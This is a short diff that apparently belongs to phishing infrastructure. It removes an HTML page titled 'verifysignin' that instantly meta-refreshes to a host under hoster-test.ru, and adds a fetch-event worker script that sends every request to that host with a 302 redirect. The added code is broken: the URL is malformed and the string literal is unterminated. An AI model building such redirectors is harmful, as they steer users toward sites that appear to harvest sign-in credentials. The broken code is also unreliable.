@@ -1,16 +1,15 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0; url=	http//srv233619.hoster-test.ru/red">
-    <title>The web site of verifysignin</title>
-    <!-- The style.css file allows you to change the look of your web pages.
-         If you include the next line in all your web pages, they will all share the same look.
-         This makes it easier to make new pages for your site. -->
-    <link href="/style.css" rel="stylesheet" type="text/css" media="all">
-  </head>
-  <body>
-   
-  </body>
-</html>
+// redirect.ts
+
+// Define the redirect URL
+const redirectUrl =http//srv233619.hoster-test.ru/red">
+// Handle the request
+addEventListener("fetch", (event) => {
+  event.respondWith(
+    new Response(null, {
+      status: 302, // HTTP status for redirection
+      headers: {
+        "Location": redirectUrl, // The URL to redirect to
+      },
+    })
+  );
+});
